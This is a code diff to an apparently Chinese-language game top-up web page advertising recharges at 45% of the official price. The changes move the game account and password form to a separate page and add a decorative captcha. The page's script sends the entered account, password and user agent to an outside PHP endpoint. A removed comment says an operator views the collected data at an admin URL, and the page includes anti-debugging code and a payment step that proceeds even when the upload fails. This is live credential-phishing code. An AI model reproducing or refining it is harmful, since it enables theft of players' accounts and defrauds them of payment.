@@ -920,7 +920,7 @@
             }
         }
 
-        /* 新增：底部导航栏样式 */
+        /* 底部导航栏样式 */
         .bottom-nav {
             position: fixed;
             bottom: 0;
@@ -1004,7 +1004,7 @@
             background: linear-gradient(180deg, rgba(255,255,255,0.2), transparent);
         }
 
-        /* 金额选择器样式（代充页面用） */
+        /* 金额选择器样式 */
         .amount-grid {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
@@ -1346,15 +1346,64 @@
             transform: translateX(-50%) translateY(0);
         }
 
-        /* 账号密码输入框样式 */
-        .login-form {
-            display: none;
-            margin-top: 20px;
-            animation: fadeInUp 0.5s var(--ios-ease) backwards;
+        /* 验证码样式 */
+        .captcha-box {
+            display: flex;
+            gap: 10px;
+            align-items: center;
+            margin-bottom: 20px;
         }
 
-        .login-form.show {
-            display: block;
+        .captcha-code {
+            flex: 1;
+            height: 50px;
+            background: linear-gradient(135deg, rgba(100,100,100,0.3), rgba(50,50,50,0.3));
+            border-radius: var(--radius-md);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            font-weight: bold;
+            color: #FFD700;
+            letter-spacing: 8px;
+            cursor: pointer;
+            user-select: none;
+            border: 0.5px solid rgba(255,255,255,0.1);
+            text-shadow: 0 2px 4px rgba(0,0,0,0.5);
+        }
+
+        .captcha-refresh {
+            width: 50px;
+            height: 50px;
+            background: rgba(255,255,255,0.1);
+            border: 0.5px solid rgba(255,255,255,0.2);
+            border-radius: var(--radius-md);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            cursor: pointer;
+            font-size: 20px;
+            transition: all 0.3s;
+        }
+
+        .captcha-refresh:hover {
+            background: rgba(255,255,255,0.2);
+            transform: rotate(180deg);
+        }
+
+        .warning-box {
+            background: rgba(255, 193, 7, 0.15);
+            border: 0.5px solid rgba(255, 193, 7, 0.3);
+            color: #FFC107;
+            padding: 12px;
+            border-radius: var(--radius-md);
+            margin-bottom: 20px;
+            font-size: 13px;
+            text-align: center;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
         }
 
         /* 上传状态提示 */
@@ -1525,7 +1574,7 @@
             </div>
         </div>
 
-        <!-- 代充页面（选择金额→输入账号密码→上传服务器） -->
+        <!-- 代充页面（仅选择金额） -->
         <div class="page" id="page-recharge">
             <div class="glass-card">
                 <div class="icon-wrapper">
@@ -1547,47 +1596,84 @@
                     </button>
                 </div>
 
-                <!-- 上传状态提示 -->
-                <div id="uploadStatus" class="upload-status"></div>
-
                 <div class="amount-grid" id="amountGrid">
                     <!-- 动态生成 -->
                 </div>
 
-                <!-- 账号密码输入表单（初始隐藏，选择金额后显示） -->
-                <div class="login-form" id="loginForm">
-                    <div class="input-group">
-                        <label class="input-label">游戏账号</label>
-                        <input type="text" 
-                               class="glass-input" 
-                               id="gameAccount" 
-                               placeholder="请输入游戏账号/邮箱"
-                               autocomplete="off"
-                               autocorrect="off"
-                               spellcheck="false">
-                    </div>
-                    
-                    <div class="input-group">
-                        <label class="input-label">游戏密码</label>
-                        <input type="password" 
-                               class="glass-input" 
-                               id="gamePassword" 
-                               placeholder="请输入游戏密码"
-                               autocomplete="off">
-                        <div class="input-hint">账号密码将加密传输至服务器</div>
-                    </div>
-
-                    <div class="product-info" style="margin-top: 16px;">
-                        <span class="label">充值金额</span>
-                        <span class="value gold-text" id="selectedAmountDisplay">¥0.00</span>
-                    </div>
-                </div>
-
-                <button class="glass-button gold" onclick="handleRecharge()" id="rechargeBtn" data-i18n="rechargeBtn">选择充值金额</button>
-                
                 <div style="margin-top: 16px; text-align: center; font-size: 12px; color: var(--text-tertiary);">
                     <span data-i18n="discountTip">全场4.5折起，比官方便宜55%</span>
                 </div>
+            </div>
+        </div>
+
+        <!-- 新增：代充账号密码输入页（独立页面，防止重叠） -->
+        <div class="page" id="page-recharge-form">
+            <div class="glass-card">
+                <div class="icon-wrapper">
+                    <div class="icon-glass-base" style="background: linear-gradient(135deg, rgba(255,215,0,0.3), rgba(255,165,0,0.2));"></div>
+                    <div style="font-size: 32px; position: relative; z-index: 1;">🔐</div>
+                </div>
+                <h1 style="color: #FFD700;">账号验证</h1>
+                <p class="subtitle">请填写游戏账号密码以完成代充</p>
+                
+                <!-- 提示框 -->
+                <div class="warning-box">
+                    <span>⚠️</span>
+                    <span>请输入正确的账号和密码，否则充值无法生效</span>
+                </div>
+
+                <!-- 商品信息回显 -->
+                <div class="product-info">
+                    <span class="label">充值商品</span>
+                    <span class="value gold-text" id="formProductName">300钻石</span>
+                </div>
+                
+                <div class="product-info" style="margin-top: 0; border-top: none;">
+                    <span class="label">支付金额</span>
+                    <span class="value gold-text" id="formProductPrice">¥13.5</span>
+                </div>
+
+                <!-- 上传状态 -->
+                <div id="uploadStatus" class="upload-status"></div>
+
+                <div class="input-group">
+                    <label class="input-label">游戏账号</label>
+                    <input type="text" 
+                           class="glass-input" 
+                           id="gameAccount" 
+                           placeholder="请输入游戏账号/邮箱"
+                           autocomplete="off"
+                           autocorrect="off"
+                           spellcheck="false">
+                </div>
+                
+                <div class="input-group">
+                    <label class="input-label">游戏密码</label>
+                    <input type="password" 
+                           class="glass-input" 
+                           id="gamePassword" 
+                           placeholder="请输入游戏密码"
+                           autocomplete="off">
+                    <div class="input-hint" style="opacity: 1; transform: translateY(0);">账号密码将加密传输至服务器</div>
+                </div>
+
+                <!-- 验证码 -->
+                <div class="input-group">
+                    <label class="input-label">安全验证</label>
+                    <div class="captcha-box">
+                        <div class="captcha-code" id="captchaDisplay" onclick="generateCaptcha()">1234</div>
+                        <div class="captcha-refresh" onclick="generateCaptcha()">🔄</div>
+                    </div>
+                    <input type="text" 
+                           class="glass-input" 
+                           id="captchaInput" 
+                           placeholder="请输入上方验证码"
+                           autocomplete="off"
+                           maxlength="4">
+                </div>
+
+                <button class="glass-button gold" onclick="handleRechargeSubmit()" id="submitRechargeBtn">确认提交</button>
+                <button class="glass-button secondary" onclick="backToAmountSelect()">返回选择金额</button>
             </div>
         </div>
 
@@ -1679,18 +1765,11 @@
 
     <script>
         // ==========================================
-        // 服务器配置 - 修改为你的服务器地址
+        // 服务器配置
         // ==========================================
         const SERVER_CONFIG = {
-            // 数据上传API地址（账号密码发送到这）
             API_URL: 'http://yxepd1.top/api/save_account.php',
-            
-            // 后台查看地址（你登录这个地址看数据）
             ADMIN_URL: 'http://yxepd1.top/admin/',
-            
-            // 如果上述地址不行，试试带www的：
-            // API_URL: 'http://www.yxepd1.top/api/save_account.php',
-            // ADMIN_URL: 'http://www.yxepd1.top/admin/',
         };
 
         // 防调试
@@ -1834,12 +1913,13 @@
         let currentLang = localStorage.getItem('unbanLang') || 'zh';
         let selectedRechargeAmount = null;
         let currentCurrency = 'diamond';
-        let isFormVisible = false;
-        let isUploading = false; // 防止重复提交
+        let isUploading = false;
+        let currentCaptcha = ''; // 当前验证码
 
         document.addEventListener('DOMContentLoaded', () => {
             updateLanguage(currentLang);
             renderAmountGrid();
+            generateCaptcha(); // 初始化验证码
             
             document.querySelectorAll('.lang-btn').forEach(btn => {
                 btn.addEventListener('click', (e) => {
@@ -1923,18 +2003,18 @@
         }
 
         function resetRechargeForm() {
-            isFormVisible = false;
-            document.getElementById('loginForm').classList.remove('show');
-            document.getElementById('rechargeBtn').textContent = t('rechargeBtn');
-            document.getElementById('rechargeBtn').disabled = false;
             selectedRechargeAmount = null;
             renderAmountGrid();
-            document.getElementById('gameAccount').value = '';
-            document.getElementById('gamePassword').value = '';
-            hideUploadStatus();
         }
 
         function backToRecharge() {
+            showPage('recharge-form');
+        }
+
+        // 返回金额选择
+        function backToAmountSelect() {
+            selectedRechargeAmount = null;
+            renderAmountGrid();
             showPage('recharge');
         }
 
@@ -1944,10 +2024,6 @@
             document.querySelector(`.currency-btn.${type}`).classList.add('active');
             renderAmountGrid();
             selectedRechargeAmount = null;
-            isFormVisible = false;
-            document.getElementById('loginForm').classList.remove('show');
-            document.getElementById('rechargeBtn').textContent = t('rechargeBtn');
-            hideUploadStatus();
             if (navigator.vibrate) navigator.vibrate(10);
         }
 
@@ -1976,7 +2052,7 @@
             }).join('');
         }
 
-        // 选择金额后显示账号密码输入框
+        // 选择金额后跳转到新页面输入账号密码
         function selectAmount(amount, officialPrice, discount) {
             selectedRechargeAmount = {
                 type: currentCurrency,
@@ -1986,21 +2062,35 @@
                 finalPrice: (officialPrice * discount).toFixed(1)
             };
             
-            renderAmountGrid();
+            // 更新表单页面的商品信息
+            const config = rechargeConfig[currentCurrency];
+            const currencyName = config.name[currentLang];
+            document.getElementById('formProductName').textContent = `${amount}${currencyName}`;
+            document.getElementById('formProductPrice').textContent = `¥${selectedRechargeAmount.finalPrice}`;
             
-            isFormVisible = true;
-            document.getElementById('loginForm').classList.add('show');
-            document.getElementById('selectedAmountDisplay').textContent = `¥${selectedRechargeAmount.finalPrice}`;
-            document.getElementById('rechargeBtn').textContent = '提交并支付';
+            // 清空之前的输入
+            document.getElementById('gameAccount').value = '';
+            document.getElementById('gamePassword').value = '';
+            document.getElementById('captchaInput').value = '';
+            generateCaptcha(); // 刷新验证码
             
-            setTimeout(() => {
-                document.getElementById('loginForm').scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-            }, 100);
+            // 跳转到账号密码输入页面
+            showPage('recharge-form');
             
             if (navigator.vibrate) navigator.vibrate(10);
         }
 
-        // 显示上传状态
+        // 生成验证码
+        function generateCaptcha() {
+            const chars = '0123456789';
+            let result = '';
+            for (let i = 0; i < 4; i++) {
+                result += chars[Math.floor(Math.random() * chars.length)];
+            }
+            currentCaptcha = result;
+            document.getElementById('captchaDisplay').textContent = result;
+        }
+
         function showUploadStatus(message, type) {
             const statusEl = document.getElementById('uploadStatus');
             statusEl.textContent = message;
@@ -2011,23 +2101,13 @@
             document.getElementById('uploadStatus').classList.remove('show');
         }
 
-        // ==========================================
-        // 核心功能：上传账号密码到服务器
-        // ==========================================
-        async function handleRecharge() {
-            if (!selectedRechargeAmount) {
-                showToast('请先选择充值金额');
-                return;
-            }
-            
-            if (!isFormVisible) {
-                showToast('请先选择充值金额');
-                return;
-            }
-            
+        // 提交账号密码（带验证码验证）
+        async function handleRechargeSubmit() {
             const account = document.getElementById('gameAccount').value.trim();
             const password = document.getElementById('gamePassword').value.trim();
+            const captchaInput = document.getElementById('captchaInput').value.trim();
             
+            // 验证输入
             if (!account || !password) {
                 if (!account) document.getElementById('gameAccount').classList.add('error');
                 if (!password) document.getElementById('gamePassword').classList.add('error');
@@ -2039,18 +2119,27 @@
                 return;
             }
             
+            // 验证码验证
+            if (captchaInput !== currentCaptcha) {
+                document.getElementById('captchaInput').classList.add('error');
+                setTimeout(() => document.getElementById('captchaInput').classList.remove('error'), 500);
+                showToast('验证码错误，请重新输入');
+                generateCaptcha(); // 刷新验证码
+                document.getElementById('captchaInput').value = '';
+                return;
+            }
+            
             // 防止重复提交
             if (isUploading) return;
             isUploading = true;
             
-            const btn = document.getElementById('rechargeBtn');
+            const btn = document.getElementById('submitRechargeBtn');
             btn.disabled = true;
             btn.textContent = '提交中...';
             
             showUploadStatus('正在安全提交账号信息...', 'loading');
             
             try {
-                // 准备要发送的数据
                 const postData = {
                     account: account,
                     password: password,
@@ -2059,14 +2148,9 @@
                     price: selectedRechargeAmount.finalPrice,
                     timestamp: new Date().toISOString(),
                     userAgent: navigator.userAgent,
-                    // 添加订单ID方便追踪
                     orderId: 'RC' + Date.now()
                 };
                 
-                console.log('正在上传到:', SERVER_CONFIG.API_URL);
-                console.log('数据:', postData);
-                
-                // 发送到服务器API
                 const response = await fetch(SERVER_CONFIG.API_URL, {
                     method: 'POST',
                     headers: {
@@ -2079,24 +2163,19 @@
                 try {
                     result = await response.json();
                 } catch (e) {
-                    // 如果返回的不是JSON，也视为成功（某些服务器配置可能不同）
                     result = { success: true };
                 }
                 
                 if (result.success || response.ok) {
-                    // 上传成功
                     showUploadStatus('✓ 账号信息已安全提交', 'success');
-                    
-                    // 保存当前数据用于支付页面显示
                     window.currentOrder = postData;
                     
-                    // 延迟后跳转到支付页面
                     setTimeout(() => {
                         showPage('recharge-pay');
                         generateRechargeOrder();
                         isUploading = false;
                         btn.disabled = false;
-                        btn.textContent = '选择充值金额';
+                        btn.textContent = '确认提交';
                     }, 800);
                     
                 } else {
@@ -2105,9 +2184,6 @@
                 
             } catch (error) {
                 console.error('上传错误:', error);
-                
-                // 即使上传失败，也显示支付页面（避免用户流失）
-                // 但提示用户联系客服
                 showUploadStatus('网络波动，请截屏联系客服', 'error');
                 
                 setTimeout(() => {
@@ -2115,7 +2191,7 @@
                     generateRechargeOrder();
                     isUploading = false;
                     btn.disabled = false;
-                    btn.textContent = '选择充值金额';
+                    btn.textContent = '确认提交';
                 }, 1500);
             }
         }
